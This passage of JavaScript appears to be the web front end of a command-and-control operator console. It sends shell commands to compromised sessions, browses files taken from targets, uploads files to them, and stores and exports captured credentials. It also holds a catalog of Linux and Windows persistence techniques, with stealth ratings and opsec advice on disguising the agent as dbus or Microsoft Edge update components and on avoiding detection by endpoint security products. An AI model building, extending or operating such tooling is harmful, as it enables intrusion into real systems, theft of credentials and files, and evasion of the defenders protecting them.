      _appendOutput({
        ts: new Date().toISOString(), operator: API.getUsername(),
        command: cmd, cmd_id: cmdId, pending: true,
      });
    }

    const _reenable = () => {
      if (inp)     inp.disabled = false;
      if (sendBtn) sendBtn.disabled = false;
      if (inp)     inp.focus();
    };

    // Cancel stale pending entries only for local slash commands (fire-and-forget path)
    const _cancelStalePending = () => {
      if (!hist) return;
      $$('.co.pending, .co.queued', hist).forEach(el => {
        if (el.id === `out-${cmdId}`) return; // never cancel our own entry
        if (el.dataset.active) return;        // protected in-flight file-pick
        el.textContent = 'cancelled — next command sent';
        el.classList.remove('pending', 'queued');
        el.classList.add('warn');
      });
    };

    if (isSlash) {
      // Capture element reference before _runSlash may promote the id (local→real).
      // Used for exclusion in the stale-cancel scan below — DOM identity survives id rename.
      const myEl = document.getElementById(`out-${cmdId}`);
      try {
        await _runSlash(slash, parts.slice(1), cmdId);
        // Server accepted — safe to cancel stale pending entries from previous commands.
        // Skip for file-pick commands: the pending entry was created inside _runSlash
        // (not before myEl capture), so myEl is null and can't protect it.
        if (hist && !_isFilePick) {
          $$('.co.pending, .co.queued', hist).forEach(el => {
            if (el === myEl) return;
            if (el.dataset.active) return;
            el.textContent = 'cancelled — next command sent';
            el.classList.remove('pending', 'queued');
            el.classList.add('warn');
          });
        }
      } catch (e) {
        if (e?._filePickerOpened) return;
        _setOutput(cmdId, `Error: ${e.message}`, true);
        Toast.error('Command failed', e.message);
      } finally { _reenable(); }
      return;
    }

    try {
      const r = await API.sendCommand(_activeId, cmd, cmd);
      if (r && r.ok === false) {
        // Server rejected — do NOT cancel other pending entries (lock still in flight)
        const lockId  = r.locked_cmd_id ? ` [${r.locked_cmd_id.slice(0, 8)}]` : '';
        const msg = r.locked_by
          ? `Lock held by '${r.locked_by}'${lockId}`
          : (r.error || 'Command rejected — another operator holds the lock');
        _setOutput(cmdId, msg, true);
        Toast.warning('Command blocked', msg);
      } else {
        // Server accepted — now it's safe to cancel stale pending entries
        _cancelStalePending();
        if (r?.cmd_id && r.cmd_id !== cmdId) {
          _promoteIdManual(cmdId, r.cmd_id);
          _localCmdIds.add(r.cmd_id);
        }
      }
    } catch (e) {
      _setOutput(cmdId, `Error: ${e.message}`, true);
      Toast.error('Command failed', e.message);
    } finally { _reenable(); }
  }

  /* ── artifacts tab ───────────────────────────────────────────────────────── */
  function _mimeToLabel(mime) {
    if (!mime) return '—';
    if (mime.startsWith('text/'))  return 'TEXT';
    if (mime.startsWith('image/')) return 'IMAGE';
    if (mime.startsWith('audio/')) return 'AUDIO';
    if (mime.startsWith('video/')) return 'VIDEO';
    if (mime === 'application/pdf') return 'PDF';
    if (/zip|gzip|x-tar|x-rar|7z|bzip/.test(mime)) return 'ARCHIVE';
    if (mime.includes('json'))   return 'JSON';
    if (mime.includes('xml'))    return 'XML';
    if (mime.includes('html'))   return 'HTML';
    if (mime.includes('javascript') || mime.includes('ecmascript')) return 'JS';
    if (mime.includes('sqlite') || mime.includes('sql')) return 'DB';
    if (mime.includes('x509') || mime.includes('pkix') || mime.includes('pem')) return 'CERT';
    if (mime.includes('krb5'))   return 'KRB';
    if (mime.includes('php'))    return 'PHP';
    if (mime.includes('shellscript')) return 'SHELL';
    if (mime === 'application/octet-stream') return 'BLOB';
    const sub = (mime.split('/')[1] || mime).replace(/^x-/, '').replace(/[^a-z0-9]/gi, '').toUpperCase();
    return sub.slice(0, 6) || 'BLOB';
  }

  function _loadArtifacts() {
    const tbody  = $('#artifacts-tbody');
    const otbody = $('#ontarget-tbody');
    if (!tbody || !_activeId) return;

    tbody.innerHTML  = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">Loading…</td></tr>';
    if (otbody) otbody.innerHTML = '<tr><td colspan="3" class="ts" style="text-align:center;padding:1rem">Loading…</td></tr>';

    /* ── exfiltrated files (saved via /download) ── */
    const thName = $('#th-exfil-name');
    if (thName) thName.textContent = _exfilShowPath ? 'Filepath' : 'Filename';

    API.downloadedFiles(_activeId).then(data => {
      if (!data || !data.length) {
        tbody.innerHTML = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">No exfiltrated files for this session</td></tr>';
        return;
      }
      tbody.innerHTML = '';
      const icoDown = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 13l7 7 7-7"/><line x1="4" y1="20" x2="20" y2="20"/></svg>`;
      const icoEye  = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
      const icoTras = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>`;
      data.forEach(f => {
        const tr = document.createElement('tr');
        const relPath    = _dlRelPath(f.local_path);
        const dlUrl      = API.downloadedFileUrl(_activeId, relPath);
        const canAct     = f.downloadable && f.exists;
        const remotePath = f.remote_path || f.filename;
        const nameCell   = _exfilShowPath
          ? `<code class="exfil-path" title="${escHtml(remotePath)}">${escHtml(remotePath)}</code>`
          : `<code class="exfil-path">${escHtml(f.filename)}</code>`;
        const typeLabel  = _mimeToLabel(f.mime_type);
        const md5Short   = f.md5 ? f.md5.slice(0, 12) : '—';
        const md5Cell    = f.md5
          ? `<span class="af-md5" title="${escHtml(f.md5)}">${escHtml(md5Short)}…</span>`
          : '<span class="ts">—</span>';
        const dlCell  = canAct
          ? `<a href="${escHtml(dlUrl)}" download="${escHtml(f.filename)}" class="btn-sm btn-sm-ghost" title="Download">${icoDown}<span class="btn-label"> Down</span></a>`
          : `<span class="ts">${f.exists ? 'local only' : 'missing'}</span>`;
        const showBtn = canAct
          ? `<button class="btn-sm btn-sm-ghost js-show-file" data-url="${escHtml(dlUrl)}" data-name="${escHtml(f.filename)}" data-size="${f.size_bytes ?? ''}" data-type="${escHtml(typeLabel)}" data-md5="${escHtml(f.md5 || '')}" title="Preview">${icoEye}<span class="btn-label"> View</span></button>`
          : '';
        const delBtn  = f.exists
          ? `<button class="btn-sm btn-sm-ghost btn-sm-danger js-del-file" data-rel="${escHtml(relPath)}" data-name="${escHtml(f.filename)}" title="Delete">${icoTras}<span class="btn-label"> Del</span></button>`
          : '';
        tr.innerHTML =
          `<td class="hi">${nameCell}</td>` +
          `<td><span class="af-type-badge">${escHtml(typeLabel)}</span></td>` +
          `<td class="ts">${f.size_bytes != null ? _fmtSize(f.size_bytes) : '—'}</td>` +
          `<td>${md5Cell}</td>` +
          `<td class="ts" style="white-space:nowrap">${escHtml(fmtDateTime(f.timestamp))}</td>` +
          `<td class="af-actions"><div class="af-actions-inner">${dlCell}${showBtn}${delBtn}</div></td>`;
        tbody.appendChild(tr);
      });
    }).catch(() => {
      tbody.innerHTML = '<tr><td colspan="4" class="ts" style="text-align:center;padding:1rem">Failed to load</td></tr>';
    });

    /* ── on-target artifacts (enc_staged_agent, persistence, etc.) ── */
    if (!otbody) return;
    API.artifacts(_activeId).then(data => {
      if (!data || !data.length) {
        otbody.innerHTML = '<tr><td colspan="3" class="ts" style="text-align:center;padding:1rem">No artifacts recorded</td></tr>';
        return;
      }
      otbody.innerHTML = '';
      data.forEach(a => {
        const tr    = document.createElement('tr');
        const slug  = (a.type || '').replace(/[^a-z0-9]/gi, '_').toLowerCase();
        tr.innerHTML =
          `<td><span class="art-badge art-badge-${escHtml(slug)}">${escHtml(a.type)}</span></td>` +
          `<td class="hi"><code style="word-break:break-all">${escHtml(a.path)}</code></td>` +
          `<td class="ts" style="white-space:nowrap">${escHtml(fmtDateTime(a.recorded_at))}</td>`;
        otbody.appendChild(tr);
      });
    }).catch(() => {
      otbody.innerHTML = '<tr><td colspan="3" class="ts" style="text-align:center;padding:1rem">Failed to load</td></tr>';
    });

    _loadUploads();
  }

  async function _showFilePreview(url, name, sizeRaw, fileType, md5) {
    const pre   = $('#file-preview-body');
    const title = $('#file-preview-title');
    const meta  = $('#file-preview-meta');
    if (!pre) return;

    title.textContent = name;
    pre.textContent   = 'Loading…';
    meta.textContent  = '';
    Modal.open('file-preview-modal');

    try {
      const res = await fetch(url, { credentials: 'same-origin' });
      if (!res.ok) { pre.textContent = `Error ${res.status}: could not fetch file`; return; }

      const buf  = await res.arrayBuffer();
      const size = sizeRaw ? parseInt(sizeRaw, 10) : buf.byteLength;

      // Detect binary: look for null bytes in first 8 KB
      const probe = new Uint8Array(buf, 0, Math.min(buf.byteLength, 8192));
      const isBinary = probe.some(b => b === 0);

      if (isBinary) {
        pre.textContent = `[binary file — ${_fmtSize(buf.byteLength)}]\n\nUse ⬇ Download to save it locally.`;
      } else {
        const text = new TextDecoder('utf-8', { fatal: false }).decode(buf);
        pre.textContent = text;
      }
      const parts = [_fmtSize(size)];
      if (fileType) parts.push(fileType);
      if (md5) parts.push(`MD5: ${md5}`);
      meta.textContent = parts.join(' · ');
    } catch (err) {
      pre.textContent = `Error: ${err.message}`;
    }
  }

  function _openUploadModal(prefilledRemote, shellCmdId) {
    const remoteFld = $('#upload-remote-path');
    const fileInp   = $('#upload-file-input');
    const statusEl  = $('#upload-status');
    const submitBtn = $('#upload-modal-submit');
    if (!remoteFld || !fileInp) return;

    remoteFld.value  = prefilledRemote || '';
    fileInp.value    = '';
    statusEl.textContent = '';
    statusEl.style.color = '';
    submitBtn.disabled   = false;
    Modal.open('upload-modal');
    setTimeout(() => (prefilledRemote ? fileInp : remoteFld).focus(), 80);

    submitBtn.onclick = async () => {
      const file       = fileInp.files?.[0];
      const remotePath = remoteFld.value.trim();
      if (!file)       { statusEl.style.color = 'var(--accent)'; statusEl.textContent = 'Select a file first.'; return; }
      if (!remotePath) { statusEl.style.color = 'var(--accent)'; statusEl.textContent = 'Remote destination path required.'; return; }

      submitBtn.disabled = true;
      statusEl.style.color = 'var(--text-muted)';
      statusEl.textContent = `Uploading ${file.name} to staging…`;

      _appendOutput({
        ts: new Date().toISOString(), operator: API.getUsername(),
        command: `/upload ${file.name} → ${remotePath}`, cmd_id: shellCmdId, pending: true,
      });

      try {
        const result = await API.uploadFile(_activeId, file, remotePath);
        Modal.close('upload-modal');
        const cmd = result?.command;
        if (cmd?.cmd_id && shellCmdId) {
          _promoteIdManual(shellCmdId, cmd.cmd_id);
          _setQueued(cmd.cmd_id, `/upload ${file.name} → ${remotePath} queued`);
        } else if (shellCmdId) {
          _setOutput(shellCmdId, `${file.name} uploaded to staging — agent notified`);
        }
      } catch (err) {
        statusEl.style.color = 'var(--accent)';
        statusEl.textContent = `Error: ${err.message || err}`;
        _setOutput(shellCmdId, `Error: ${err.message || err}`, true);
        submitBtn.disabled = false;
      }
    };
  }

  /* Extract path relative to downloads/ for the download URL */
  function _dlRelPath(localPath) {
    const norm = localPath.replace(/\\/g, '/');
    const m = norm.match(/downloads\/(.+)$/);
    return m ? m[1] : norm.split('/').pop();
  }

  function _fmtSize(bytes) {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes/1024).toFixed(1)} KB`;
    return `${(bytes/1048576).toFixed(1)} MB`;
  }

  /* ── uploads section (within Artifacts tab) ──────────────────────────────── */
  const _icoTras    = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>`;
  const _icoCheck   = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`;
  const _icoRestore = `<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-5"/></svg>`;

  function _ulStatusBadge(removed) {
    return removed
      ? `<span class="ul-badge ul-badge-removed">✕ removed</span>`
      : `<span class="ul-badge ul-badge-live">● on target</span>`;
  }

  function _ulActionsHtml(rpath, fname, removed) {
    const delBtn  = `<button class="btn-sm btn-sm-ghost btn-sm-danger js-ul-delete" data-rpath="${escHtml(rpath)}" data-name="${escHtml(fname)}" title="Send rm/del command on target"${removed ? ' disabled' : ''}>${_icoTras} Delete</button>`;
    const markBtn = removed
      ? `<button class="btn-sm btn-sm-ghost js-ul-restore" data-rpath="${escHtml(rpath)}" data-name="${escHtml(fname)}" title="Restore — undo mark as removed">${_icoRestore} Restore</button>`
      : `<button class="btn-sm btn-sm-ghost js-ul-mark" data-rpath="${escHtml(rpath)}" data-name="${escHtml(fname)}" title="Mark as removed (no shell command)">${_icoCheck} Mark as removed</button>`;
    return delBtn + markBtn;
  }

  function _ulMarkRowRemoved(tr) {
    const statusCell = tr.querySelector('.ul-status-cell');
    const actCell    = tr.querySelector('td:last-child');
    if (statusCell) statusCell.innerHTML = _ulStatusBadge(true);
    if (actCell)    actCell.innerHTML    = _ulActionsHtml(tr.dataset.remotePath, tr.dataset.filename, true);
  }

  function _ulMarkRowRestored(tr) {
    const statusCell = tr.querySelector('.ul-status-cell');
    const actCell    = tr.querySelector('td:last-child');
    if (statusCell) statusCell.innerHTML = _ulStatusBadge(false);
    if (actCell)    actCell.innerHTML    = _ulActionsHtml(tr.dataset.remotePath, tr.dataset.filename, false);
  }

  function _loadUploads() {
    const tbody = $('#uploads-tbody');
    if (!tbody || !_activeId) return;

    tbody.innerHTML = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">Loading…</td></tr>';

    API.listUploads(_activeId).then(data => {
      if (!data || !data.length) {
        tbody.innerHTML = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">No uploads confirmed for this session</td></tr>';
        return;
      }
      tbody.innerHTML = '';
      data.forEach(f => {
        const tr = document.createElement('tr');
        const isRemoved = f.status === 'removed';
        tr.dataset.remotePath = f.remote_path;
        tr.dataset.filename   = f.filename;
        tr.innerHTML =
          `<td class="hi"><code>${escHtml(f.filename)}</code></td>` +
          `<td class="ts">${f.size != null ? _fmtSize(f.size) : '—'}</td>` +
          `<td class="ts" style="word-break:break-all"><code style="font-size:.75rem">${escHtml(f.remote_path || '—')}</code></td>` +
          `<td class="ts" style="white-space:nowrap">${escHtml(fmtDateTime(f.timestamp))}</td>` +
          `<td class="ul-status-cell" style="text-align:center">${_ulStatusBadge(isRemoved)}</td>` +
          `<td style="display:flex;gap:.4rem;align-items:center;justify-content:center">${_ulActionsHtml(f.remote_path, f.filename, isRemoved)}</td>`;
        tbody.appendChild(tr);
      });
    }).catch(() => {
      tbody.innerHTML = '<tr><td colspan="6" class="ts" style="text-align:center;padding:1rem">Failed to load</td></tr>';
    });
  }

  /* ── history tab ─────────────────────────────────────────────────────────── */
  function _showCmdDetail(h) {
    const meta = document.getElementById('cmd-detail-meta');
    const cmd  = document.getElementById('cmd-detail-cmd');
    const out  = document.getElementById('cmd-detail-out');
    if (!meta || !cmd || !out) return;
    meta.innerHTML =
      `<div><span>Time</span>${escHtml(fmtTs(h.timestamp || ''))}</div>` +
      `<div><span>Operator</span>${escHtml(h.operator || '—')}</div>` +
      `<div><span>ID</span>${escHtml(h.cmd_id || '—')}</div>`;
    cmd.textContent = h.command || '';
    out.textContent = h.response || '(no output)';
    Modal.open('cmd-detail-modal');
  }

  let _xlsxPromise = null;
  function _loadXlsx() {
    if (_xlsxPromise) return _xlsxPromise;
    _xlsxPromise = new Promise((resolve, reject) => {
      const s = document.createElement('script');
      s.src = '/js/vendor/xlsx.mini.min.js';
      s.onload  = () => resolve();
      s.onerror = () => { _xlsxPromise = null; reject(new Error('Failed to load xlsx library')); };
      document.head.appendChild(s);
    });
    return _xlsxPromise;
  }

  async function _exportXlsx(sessionId, histData) {
    await _loadXlsx();
    const [artifacts, uploads, credentials] = await Promise.all([
      API.artifacts(sessionId).catch(() => []),
      API.listUploads(sessionId).catch(() => []),
      API.listCredentials(sessionId).catch(() => []),
    ]);

    const hist = histData || [];
    if (!hist.length && !artifacts.length && !uploads.length && !credentials.length) return false;

    const wb = XLSX.utils.book_new();

    const _ts = iso => fmtDateTime(iso || '');

    // Sheet 1 — Commands
    const cmdRows = [['Timestamp', 'CMD ID', 'Operator', 'Command', 'Response']];
    hist.forEach(h => cmdRows.push([_ts(h.timestamp), h.cmd_id ?? '', h.operator ?? '', h.command ?? '', h.response ?? '']));
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(cmdRows), 'Commands');

    // Sheet 2 — Artifacts
    const artRows = [['Timestamp', 'Type', 'Path']];
    artifacts.forEach(a => artRows.push([_ts(a.recorded_at), a.type ?? '', a.path ?? '']));
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(artRows), 'Artifacts');

    // Sheet 3 — Uploads
    const ulRows = [['Timestamp', 'Filename', 'Remote Path', 'Size (bytes)', 'CMD ID', 'Status']];
    uploads.forEach(u => ulRows.push([_ts(u.timestamp), u.filename ?? '', u.remote_path ?? '', u.size ?? '', u.cmd_id ?? '', u.status || 'on target']));
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(ulRows), 'Uploads');

    // Sheet 4 — Credentials
    const credRows = [['Timestamp', 'Source', 'Username', 'Secret', 'Type', 'Domain', 'Protocol', 'Host', 'Port', 'Notes', 'Operator']];
    credentials.forEach(c => credRows.push([
      _ts(c.timestamp), c.source ?? '', c.username ?? '', c.secret ?? '',
      c.secret_type ?? '', c.domain ?? '', c.protocol ?? '', c.host ?? '',
      c.port ?? '', c.notes ?? '', c.operator ?? '',
    ]));
    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(credRows), 'Credentials');

    XLSX.writeFile(wb, `report_${sessionId}.xlsx`);
    return true;
  }

  function _renderHistory() {
    const tbody = $('#hist-tbody');
    if (!tbody || !_activeId) return;
    tbody.innerHTML = '<tr><td colspan="5" class="ts" style="text-align:center;padding:1.2rem">Loading…</td></tr>';

    const dlBtn  = document.getElementById('btn-hist-dl');
    const search = document.getElementById('hist-search');
    if (dlBtn) dlBtn.onclick = null;
    if (search) { search.value = ''; search.oninput = null; }

    API.history(_activeId).then(data => {
      if (!data || !data.length) {
        tbody.innerHTML = '<tr><td colspan="5" class="ts" style="text-align:center;padding:1.2rem">No commands recorded</td></tr>';
        if (dlBtn) dlBtn.onclick = async () => {
          try {
            const ok = await _exportXlsx(_activeId, []);
            if (!ok) Toast.warning('Nothing to export', 'No commands, artifacts or uploads recorded for this session.');
          } catch(e) {
            Toast.error('Export failed', e.message);
          }
        };
        return;
      }
      tbody.innerHTML = '';
      [...data].reverse().forEach(h => {
        const tr = document.createElement('tr');
        tr.className = 'clickable';
        const raw     = (h.response || '');
        const preview = raw.length > 120 ? raw.slice(0, 120) + '…' : raw;
        tr.innerHTML = `
          <td class="ts" style="white-space:nowrap">${escHtml(fmtTs(h.timestamp || ''))}</td>
          <td class="ts">${escHtml((h.cmd_id || '—').slice(0, 8))}</td>
          <td class="ts">${escHtml(h.operator || '—')}</td>
          <td class="hi"><code>${escHtml(h.command || '')}</code></td>
          <td class="ts" style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(preview)}</td>`;
        tr.addEventListener('click', () => _showCmdDetail(h));
        tbody.appendChild(tr);
      });

      if (search) {
        search.oninput = () => {
          const q = search.value.trim().toLowerCase();
          $$('tr', tbody).forEach(tr => {
            tr.style.display = !q || tr.textContent.toLowerCase().includes(q) ? '' : 'none';
          });
        };
      }

      if (dlBtn) {
        dlBtn.onclick = async () => {
          try {
            const ok = await _exportXlsx(_activeId, data);
            if (!ok) Toast.warning('Nothing to export', 'No commands, artifacts or uploads recorded for this session.');
          } catch(e) {
            Toast.error('Export failed', e.message);
          }
        };
      }
    }).catch(() => {
      tbody.innerHTML = '<tr><td colspan="5" class="ts" style="text-align:center;padding:1.2rem">Failed to load</td></tr>';
    });
  }

  /* ── persist tab ─────────────────────────────────────────────────────────── */

  const _PERSIST_CATALOG = {
    linux: [
      { id: 'cron-reboot', name: 'User crontab @reboot',
        desc: 'Adds a @reboot entry to the current user\'s crontab pointing to the agent binary. Re-launched at every boot with the current user\'s privileges. Zero extra dependencies beyond cron.',
        trigger: 'boot', priv: 'user', stealth: 'high', impact: 'low',
        opsec: 'Reliable across all distros. Crontab is routinely checked by defenders; a well-named binary disguised as a dbus service blends into legitimate entries. Leaves a single cron line.' },
      { id: 'systemd-user', name: 'systemd user service',
        desc: 'Creates a user-scoped systemd service under ~/.config/systemd/user/. With loginctl linger enabled it fires at boot; otherwise at user logon only.',
        trigger: 'boot / login', priv: 'user', stealth: 'medium', impact: 'low',
        opsec: 'Linger requires polkit permission to enable — without it persistence is logon-only. File lives in the home directory under a plausible dbus-notifier name. Enumerable via `systemctl --user list-unit-files`.' },
      { id: 'systemd-system', name: 'systemd system service',
        desc: 'Creates a system-wide service in /etc/systemd/system/ (dbus-notifier.service). Fires at every boot before any user logon.',
        trigger: 'boot', priv: 'root', stealth: 'medium', impact: 'medium',
        opsec: 'Requires root. Auditors enumerate /etc/systemd/system/ routinely. Service name is plausible on modern Linux. Survives user account changes and password rotations.' },
      { id: 'rc-local', name: '/etc/rc.local injection',
        desc: 'Injects a launch line into /etc/rc.local. Fires at boot on distros that still honour SysV init (Ubuntu 18.04, CentOS 7, Debian). Creates the file if absent.',
        trigger: 'boot', priv: 'root', stealth: 'medium', impact: 'medium',
        opsec: 'Requires root. Not available on pure-systemd setups without rc-local.service enabled. Content is plain text — any privileged user can read it. Use as a secondary fallback on legacy targets.' },
      { id: 'cron-system', name: 'Root crontab @reboot',
        desc: 'Adds a @reboot entry to root\'s crontab. The agent launches at every boot with root privileges.',
        trigger: 'boot', priv: 'root', stealth: 'medium', impact: 'low',
        opsec: 'Requires root. Root crontab is explicitly audited in hardened environments. More universally available than rc-local or systemd-system. Combine with cron-reboot for user-level redundancy.' },
    ],
    windows: [
      { id: 'schtask-logon', name: 'Scheduled Task — logon',
        desc: 'Registers a task (MicrosoftEdgeUpdateTaskUserCore) that fires at current-user logon. No UAC required. Mimics a legitimate Edge auto-update task by name and path.',
        trigger: 'login', priv: 'user', stealth: 'medium', impact: 'low',
        opsec: 'Task Scheduler is monitored by most EDRs. The EdgeUpdate task name is strong camouflage but path and hash correlation can unmask it. Visible via schtasks /query.' },
      { id: 'registry-run', name: 'Registry Run key — HKCU',
        desc: 'Writes MicrosoftEdgeUpdate to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Fires at logon for the current user. No elevation needed.',
        trigger: 'login', priv: 'user', stealth: 'medium', impact: 'low',
        opsec: 'HKCU\\Run is the most monitored registry persistence key. Virtually all AV and EDR products watch it. The value name mimics Edge but hash/path correlation will flag it in managed environments.' },
      { id: 'startup-folder', name: 'Startup folder shortcut',
        desc: 'Drops a .lnk into %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. Fires at logon for the current user. No elevation.',
        trigger: 'login', priv: 'user', stealth: 'low', impact: 'low',
        opsec: 'Most visible technique — trivially enumerable by any user or defender. No EDR bypass. Use only for PoC or very low-security environments.' },
      { id: 'schtask-boot', name: 'Scheduled Task — boot (SYSTEM)',
        desc: 'Registers a machine-wide task (MicrosoftEdgeUpdateTaskMachineCore) that fires at system startup as SYSTEM. Requires admin. Fires before any user logon.',
        trigger: 'boot', priv: 'root', stealth: 'medium', impact: 'medium',
        opsec: 'Requires admin. Task runs as SYSTEM — powerful but heavily scrutinised by EDRs. AtStartup trigger is a well-known IOC. EdgeUpdate naming provides basic camouflage.' },
      { id: 'registry-run-hklm', name: 'Registry Run key — HKLM',
        desc: 'Writes MicrosoftEdgeUpdate to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Fires at logon for all users. Requires admin.',
        trigger: 'login', priv: 'root', stealth: 'low', impact: 'medium',
        opsec: 'Requires admin. HKLM\\Run is aggressively monitored — baseline scanning detects unknown values. Strongest mimicry when the target already has legitimate EdgeUpdate software installed.' },
      { id: 'wmi-event', name: 'WMI Event Subscription',
        desc: 'Creates a WMI EventFilter/Consumer/Binding triggered by EventCode 6005 (Event Log Service started = boot). APT29/Turla technique. No Task Scheduler entry, no Run key.',
        trigger: 'boot', priv: 'root', stealth: 'high', impact: 'high',
        opsec: 'Requires admin. Invisible to Autoruns, startup scans, and many baselines — no cron, task, or Run key involved. Advanced EDRs (CrowdStrike, MDE) now alert on WMI subscription creation. Avoid in CrowdStrike/MDE-protected environments.' },
      { id: 'service', name: 'Windows Service (EXE only)',
        desc: 'Registers the agent EXE as MicrosoftEdgeUpdateSvc (Automatic, restarts on failure). Starts at boot. Only available when payload is deployed as an .exe binary.',
        trigger: 'boot', priv: 'root', stealth: 'medium', impact: 'high',
        opsec: 'Requires admin + EXE payload (not available for .ps1 wrappers). Services are logged via Event ID 7045 and SCM is monitored. Very reliable — survives logoff/on cycles and crashes.' },
    ],
  };

  function _inferPersistStatus(op, content) {
    const t = (content || '').trim();
    if (op === 'status') {
      if (t.startsWith('ACTIVE:'))        return 'installed';
      if (t.startsWith('PARTIAL:'))       return 'partial';
      if (t.startsWith('NOT INSTALLED:')) return 'available';
    } else if (op === 'install') {
      if (/^OK:.*install/i.test(t) || /^OK:.*already/i.test(t)) return 'installed';
    } else if (op === 'remove') {
      if (/^OK:.*remov/i.test(t)) return 'available';
    }
    return null;
  }

  function _updatePersistRow(tid, status) {
    const row = $(`tr.ps-row[data-tid="${CSS.escape(tid)}"]`);
    if (!row) { if ($('#tp-persist.on')) _renderPersist(); return; }
    const statusCell = row.querySelector('.ps-col-status');
    if (statusCell) {
      const cls = { installed: 'ps-installed', partial: 'ps-partial',
                    available: 'ps-available', unavailable: 'ps-unavailable' }[status] || 'ps-unknown';
      const label = status || '—';
      statusCell.innerHTML = `<span class="ps-badge ${cls}">${escHtml(label)}</span>`;
    }
    const installBtn = row.querySelector('.ps-install');
    const removeBtn  = row.querySelector('.ps-remove');
    if (installBtn) installBtn.disabled = (status === 'unavailable');
    if (removeBtn)  removeBtn.disabled  = (!status || status === 'available' || status === 'unavailable');
    row.classList.add('ps-row-updated');
    setTimeout(() => row.classList.remove('ps-row-updated'), 1200);
  }

  function _parsePersistProbe(text) {
    const result = {};
    for (const line of text.split('\n')) {
      const m = line.match(/^PROBE:([^:]+):([^:]+):([^:]+):(.+)$/);
      if (m) result[m[1]] = { id: m[1], status: m[2], priv: m[3], desc: m[4] };
    }
    return result;
  }

  function _detectPersistOs() {
    const s = _sessions[_activeId];
    const os = (s?.target_os || '').toLowerCase();
    if (os.includes('windows')) return 'windows';
    if (os) return 'linux';
    return null;
  }

  async function _loadProbeFromHistory(sessionId) {
    if (_persistProbeData[sessionId] && Object.keys(_persistProbeData[sessionId]).length) return;
    try {
      const history = await API.history(sessionId);
      // Find all probe entries and merge them (last wins per technique)
      const merged = {};
      for (const h of (history || [])) {
        if (h.response && h.response.includes('PROBE:') &&
            h.command && (h.command.includes('/persist probe') || h.command.includes('PERSIST_PROBE'))) {
          Object.assign(merged, _parsePersistProbe(h.response));
        }
      }
      if (Object.keys(merged).length > 0) {
        _persistProbeData[sessionId] = merged;
        if (sessionId === _activeId && $('#tp-persist.on')) _renderPersist();
      }
    } catch { /* history unavailable */ }
  }

  /* ── Credentials tab ─────────────────────────────────────────────────────── */

  let _credsCache = {};

  async function _loadCreds() {
    if (!_activeId) return;
    try {
      _credsCache[_activeId] = await API.listCredentials(_activeId);
    } catch { /* ignore */ }
    _renderCreds();
  }

  function _renderCreds() {
    const tbody = $('#creds-tbody');
    if (!tbody || !_activeId) return;
    const creds = _credsCache[_activeId] || [];
    const countEl = $('#cred-count');
    if (countEl) countEl.textContent = creds.length ? `${creds.length} credential${creds.length !== 1 ? 's' : ''}` : '';

    if (!creds.length) {
      tbody.innerHTML = '<tr><td colspan="9" class="ts" style="text-align:center;padding:1.2rem">No credentials captured</td></tr>';
      return;
    }

    let html = '';
    for (const c of creds) {
      const badgeCls = `cred-badge cred-badge-${(c.secret_type || 'other').replace(/\s/g, '_')}`;
      html += `<tr data-cred-id="${escHtml(c.id)}">
        <td>${escHtml(c.source || '—')}</td>
        <td>${escHtml(c.protocol || '—')}</td>
        <td>${escHtml((c.host || '') + (c.port ? ':' + c.port : '') || '—')}</td>
        <td>${escHtml(c.domain || '—')}</td>
        <td>${escHtml(c.notes || '—')}</td>
        <td class="hi">${escHtml(c.username || '—')}</td>
        <td><span class="cred-secret" title="Click to copy">${escHtml(c.secret || '—')}</span></td>
        <td style="text-align:center"><span class="${badgeCls}">${escHtml(c.secret_type || 'other')}</span></td>
        <td class="cred-actions">
          <button class="btn-sm btn-sm-ghost cred-show" title="Show detail"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
          <button class="btn-sm btn-sm-ghost cred-edit" title="Edit"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3l4 4L7 21H3v-4L17 3z"/></svg></button>
